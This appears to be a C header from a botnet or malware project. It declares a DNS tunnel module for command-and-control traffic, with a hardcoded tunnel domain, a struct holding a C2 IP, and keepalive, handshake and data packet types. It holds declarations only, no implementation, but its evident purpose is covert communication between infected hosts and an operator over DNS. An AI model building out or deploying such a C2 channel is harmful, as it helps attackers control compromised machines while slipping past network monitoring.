#pragma once

#include "includes.h"

#define DNS_DOMAIN "d.fnbnet.io"
#define DNS_PORT 53

// DNS tunnel state
struct dns_tunnel_ctx {
    int fd;
    uint32_t cnc_ip;
    uint16_t seq;
    uint16_t uid;
    int active;
    int failed;
    int query_interval;
    struct sockaddr_in dns_addr;
};

// Packet types for DNS tunnel (same as polymorphic types)
#define DNS_PKT_KEEPALIVE  0xFD
#define DNS_PKT_HANDSHAKE  0xFE
#define DNS_PKT_DATA       0xFF

int dns_tunnel_init(struct dns_tunnel_ctx *ctx, uint32_t cnc_ip_addr);
int dns_tunnel_handshake(struct dns_tunnel_ctx *ctx, const char *source);
int dns_tunnel_send(struct dns_tunnel_ctx *ctx, uint8_t pkt_type, const uint8_t *data, int data_len);
int dns_tunnel_recv(struct dns_tunnel_ctx *ctx, uint8_t *out_type, uint8_t *out_data, int *out_len, int max_len);
int dns_tunnel_keepalive(struct dns_tunnel_ctx *ctx);
void dns_tunnel_close(struct dns_tunnel_ctx *ctx);
int dns_main_loop(uint32_t cnc_ip, const char *source);
